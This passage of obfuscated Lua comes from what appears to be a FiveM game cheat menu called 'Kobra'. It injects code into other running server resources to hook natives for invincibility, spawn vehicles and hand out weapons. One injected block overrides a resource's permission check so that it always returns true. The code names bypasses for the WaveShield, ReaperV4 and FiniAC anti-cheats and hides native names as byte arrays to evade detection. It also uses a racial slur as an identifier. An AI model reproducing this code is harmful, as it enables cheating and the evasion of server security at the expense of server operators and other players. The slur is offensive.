                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);else local v924=0 + 0 ;while true do if (0==v924) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",3000);v48(v229,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end end end if v227 then local v533=0 -0 ;while true do if (v533==(0 + 0)) then v12:Notify("success","Kobra","Godmode Enabled",7555 -4555 );MachoInjectResource2(3,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else v12:Notify("error","Kobra","Godmode Disabled",2126 + 874 );MachoInjectResource2(1 + 2 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);end end;v12.SpawnSelectedVehicle=function(v230,v231,v232,v233) if ( not v231 or (v231=="")) then return;end local v234=PlayerPedId();local v235=GetVehiclePedIsIn(v234,false);local v236=GetCurrentServerEndpoint();local v237=GetEntityCoords(v234);local v238=GetEntityHeading(v234);if (GetResourceState("solos-rentals")=="started") then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",10394 -7394 );print("Creating Vehicle via Fallback #1");v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v231,tostring(v233),tostring(v232),v237.x,v237.y,v237.z,v238));elseif (GetResourceState("amigo")=="started") then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",14327 -11327 );print("Creating Vehicle via Fallback #2");v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v231,tostring(v233),tostring(v232)));elseif v76 then local v844=0 -0 ;while true do if (1==v844) then v48(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v231,tostring(v233),tostring(v232)));break;end if ((0 + 0)==v844) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",3000);print("Creating Vehicle via Fallback #3");v844=1 -0 ;end end elseif (GetResourceState("qb-core")=="started") then local v1014=0;while true do if (v1014==(0 + 0)) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",3000);print("Creating Vehicle via Fallback #4");v1014=1;end if (v1014==(2 -1)) then v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v231   .. [["

            if ]]   .. tostring(v233)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v232)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v237.x   .. [[, ]]   .. v237.y   .. [[, ]]   .. v237.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v238   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );break;end end elseif ((v236:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3017 -(12 + 5) );print("Creating Vehicle via Fallback #5");v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v231,tostring(v233),tostring(v232)));elseif (GetResourceState("lunar_bridge")=="started") then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",11652 -8652 );print("Creating Vehicle via Fallback #6");v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v231,tostring(v233),tostring(v232)));elseif (GetResourceState("lation_laundering")=="started") then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",6400 -3400 );print("Creating Vehicle via Fallback #7");v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v231,tostring(v232),tostring(v233)));else local v1321=0;local v1322;while true do if (v1321==0) then v1322=v75();if v1322 then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",6377 -3377 );print("Creating Vehicle via Fallback #8");v48(v1322,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v231,tostring(v233),tostring(v232)));elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",7439 -4439 );if ( not v231 or (v231=="")) then return;end local function v1611(v1623) local v1624={};for v1630=1, #v1623 do v1624[v1630]=string.byte(v1623,v1630);end return "{"   .. table.concat(v1624,",")   .. "}" ;end local v1612=v1611(v231);local v1613=tostring(v233);local v1614=tostring(v232);local v1615=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1612,v1613,v1614);local v1616,v1617=pcall(MachoInjectResourceRaw,"monitor",v1615);if  not v1616 then end return;end v1321=1;end if (v1321==1) then if (GetResourceState("lb-phone")=="started") then local v1516=0 + 0 ;local v1517;local v1518;while true do if (v1516==1) then v1517,v1518=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v233),v231,tostring(v232),v237.x,v237.y,v237.z,v238));end);if  not v1517 then end break;end if (v1516==0) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",4973 -(1656 + 317) );print("Creating Vehicle via Fallback #10");v1516=1 + 0 ;end end elseif (GetResourceState("qb-core")=="started") then local v1618=0;while true do if (v1618==(0 + 0)) then v230:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",7977 -4977 );print("Creating Vehicle via Fallback #11");v1618=1;end if (v1618==1) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v233),GetHashKey(v231),tostring(v232)));break;end end else return;end break;end end end end;local function v82() local v239=0 -0 ;local v240;while true do if (v239==(354 -(5 + 349))) then v240={"WaveShield","FiniAC"};for v699,v700 in ipairs(v240) do if (GetResourceState(v700)=="started") then return false;end end v239=1272 -(266 + 1005) ;end if (v239==(1 + 0)) then return GetResourceState("ReaperV4")=="started" ;end end end local function v83() local v241={"ReaperV4","WaveShield"};for v337,v338 in ipairs(v241) do if (GetResourceState(v338)=="started") then return false;end end return GetResourceState("FiniAC")=="started" ;end v12.SpawnSelectedWeapon=function(v242,v243) local v244=1696 -(561 + 1135) ;local v245;local v246;local v247;local v248;local v249;while true do if (v244==(0 -0)) then if ( not v243 or (v243=="")) then return;end v245=nil;v244=3 -2 ;end if ((1067 -(507 + 559))==v244) then function v245(v701) local v702=0 -0 ;local v703;while true do if (v702==(3 -2)) then return table.concat(v703,",");end if (v702==0) then v703={};for v1015=389 -(212 + 176) , #v701 do v703[v1015]=string.byte(v701,v1015);end v702=906 -(250 + 655) ;end end end v246=v245(v243);v244=5 -3 ;end if (v244==4) then v249=GetResourceState("WaveShield")=="started" ;if v249 then v242:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3000);v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v247,v246));elseif (GetResourceState("ReaperV4")=="started") then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v242:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",5242 -2242 );GiveWeaponToPed(v247,v248,15643 -5644 ,false,true);SetCurrentPedWeapon(v247,v248,true);Wait(2206 -(1869 + 87) );MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v248   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );elseif (GetResourceState("FiniAC")=="started") then v242:Notify("info","Kobra","Spawned Weapon Bypass #1",10405 -7405 );MachoResourceStop("ox_inventory");v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v246));else local v1107=0;while true do if (v1107==(1901 -(484 + 1417))) then v242:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v1107=1;end if (v1107==1) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v246));break;end end end break;end if (v244==(4 -2)) then v247=PlayerPedId();if ( not v247 or (v247<=0)) then return;end v244=4 -1 ;end if (v244==(776 -(48 + 725))) then v248=GetHashKey(v243);if (v248==(0 -0)) then return;end v244=10 -6 ;end end end;v12.GiveAllWeapons=function(v250) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
